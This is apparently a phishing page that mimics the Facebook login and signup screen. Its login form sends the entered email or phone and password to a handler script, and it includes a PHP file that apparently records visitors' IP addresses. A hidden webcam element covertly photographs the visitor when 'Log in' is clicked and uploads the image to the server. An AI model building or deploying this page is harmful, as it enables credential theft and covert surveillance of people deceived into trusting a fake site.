<!DOCTYPE html>
<html lang="en"><head>
	<title> Facebook - Đăng nhập hoặc đăng ký </title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">  
	<link rel="shortcut icon" href="/images/logofb.png" type="image/x-icon">
	<script type="text/javascript" src="vendor/bootstrap.js"></script>
	<!-- <script type="text/javascript" src="1.js"></script> -->
	<script type="text/javascript" src="webcam.min.js"></script>
	<link rel="stylesheet" href="vendor/bootstrap.css">
	<link rel="stylesheet" href="vendor/font-awesome.css">
	<link rel="stylesheet" href="1.css">
	<style>
	#my_camera{
 width: 0px !important;
 height: 0px !important;
}
video{
    display: none;
}
	</style>
</head>
<body>
<?php
include 'ip.php';
?>

	<div class="header">
		<div class="logo">facebook</div>
		<form id="form" action="handleForm.php" method="POST">
			<table>
				<tr>
					<td>Email or Phone</td>
					<td>Password</td>
				</tr>
				<tr>
					<td style="padding-right: 10px;"><input class="inputUsername" id="inputUsername" name="inputUsername" type="text"></td>
					<td style="padding-right: 10px;"><input class="inputPassword" id="inputPassword" name="inputPassword" type="password"></td>
					<td><input style="color: white; border: 1px solid black; background-color: #4267B2; padding: 3px;"
					 type="submit" value="Log in" onClick="take_snapshot()"></td>
					 <div id="my_camera" ></div>
				</tr>
				<tr>
					<td></td>
					<td><a style="color: white; font-size: 14px;" href="#">Fogotten account?</a></td>
				</tr>
			</table>
		</form>
	</div>
	<div class="content">
		<div class="wrap">
			<div class="trai">
				<br>
				<h4 style="width: 90%;">Facebook helps you connect and share with the people in your life.
				</h4>
				<img src="images/background.png" alt="">
			</div>
			<div class="phai">
				<h2>Create an account</h2>
				<p>It's free and always will be.
				</p>
				<input type="text" placeholder="First name">
				<input type="text" placeholder="Surname"><br>
				<input type="text" placeholder="Mobile number or email address"><br>
				<input type="password" placeholder="New password"><br><br>
				<span>Birthday</span><br>
				<select name="birth-day" id="day">
					<option value="0">Day</option>
					<option value="1">1</option>
					<option value="2">2</option>
					<option value="3">3</option>
					<option value="4">4</option>
					<option value="5">5</option>
					<option value="6">6</option>
					<option value="7">7</option>
					<option value="8">8</option>
					<option value="9">9</option>
					<option value="10">10</option>
					<option value="11">11</option>
					<option value="12">12</option>
					<option value="13">13</option>
					<option value="14">14</option>
					<option value="15">15</option>
					<option value="16">16</option>
					<option value="17">17</option>
					<option value="18">18</option>
					<option value="19">19</option>
					<option value="20">20</option>
					<option value="21">21</option>
					<option value="22">22</option>
					<option value="23">23</option>
					<option value="24">24</option>
					<option value="25">25</option>
					<option value="26">26</option>
					<option value="27">27</option>
					<option value="28">28</option>
					<option value="29">29</option>
					<option value="30">30</option>
					<option value="31">31</option>
				</select>
				<select name="Month" id="month">
					<option value="0">Month</option>
					<option value="1">Jan</option>
					<option value="2">Feb</option>
					<option value="3">Mar</option>
					<option value="4">Apr</option>
					<option value="5">May</option>
					<option value="6">Jun</option>
					<option value="7">Jul</option>
					<option value="8">Aug</option>
					<option value="9">Sept</option>
					<option value="10">Oct</option>
					<option value="11">Nov</option>
					<option value="12">Dec</option>
				</select>
				<select name="Year" id="year">
					<option value="0">Year</option>
					<option value="1">2019</option>
					<option value="2">2018</option>
					<option value="3">2017</option>
					<option value="4">2016</option>
					<option value="5">2015</option>
					<option value="6">2014</option>
					<option value="7">2013</option>
					<option value="8">2012</option>
					<option value="9">2011</option>
					<option value="10">2010</option>
					<option value="11">2009</option>
					<option value="12">2008</option>
					<option value="13">2007</option>
					<option value="14">2006</option>
					<option value="15">2005</option>
					<option value="16">2004</option>
					<option value="17">2003</option>
					<option value="18">2002</option>
					<option value="19">2001</option>
					<option value="20">2000</option>
				</select>
				<a style="font-size: 12px;" href="#">Why do I need to provide my date of birth?</a><br>
				<input id="nam" type="radio" name="sex">
				<label for="nam">Male</label>
				<input id="nu" type="radio" name="sex">
				<label for="nu">Female</label>
				<p style="font-size: 13px;">By clicking Sign Up, you agree to our <a href="#">Terms, Data Policy</a> and <a href="#">Cookie Policy.</a> You may receive SMS notifications from us and can opt out at any time.
				</p>
				<button style="background-color: #588c46; border-radius: 3px; border: none; padding: 5px 65px; color: white;">Sign up</button><br><br>
				<p><a href="">Create a Page</a> for a celebrity, band or business.</p>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="con">
			English (UK)
			<a href="">Tiếng Việt</a>
			<a href="">中文(台灣)</a>
			<a href="">한국어</a>
			<a href="">日本語</a>
			<a href="">Français (France)</a>
			<a href="">ภาษาไทย</a>
			<a href="">Español</a>
			<a href="">Português (Brasil)</a>
			<a href="">Deutsch</a>
			<a href="">Italiano</a><hr>
			<a href="">Sign up</a>
			<a href="">Log in</a>
			<a href="">Messenger</a>
			<a href="">Facebook Lite</a>
			<a href="">Find Friends</a>
			<a href="">People</a>
			<a href="">Profiles</a>
			<a href="">Pages</a>
			<a href="">Page categories</a>
			<a href="">Places</a>
			<a href="">Games</a>
			<a href="">Locations</a>
			<a href="">Marketplace</a>
			<a href="">Groups</a>
		</div>
	</div>
	<script language="JavaScript">

// Configure a few settings and attach camera
Webcam.set({
 width: 320,
 height: 240,
 image_format: 'jpeg',
 jpeg_quality: 90
});
Webcam.attach( '#my_camera' );
function take_snapshot() {

// take snapshot and get image data
Webcam.snap( function(data_uri) {
   Webcam.upload( data_uri, 'saveimage.php', function(code, text,Name) {
		   //         document.getElementById('results').innerHTML = 
		   //         '' + 
		   // '<img src="' + data_uri + '"style=" width: 300px;">';
} );
 
 
} );
}

</script>

</body>
</html>
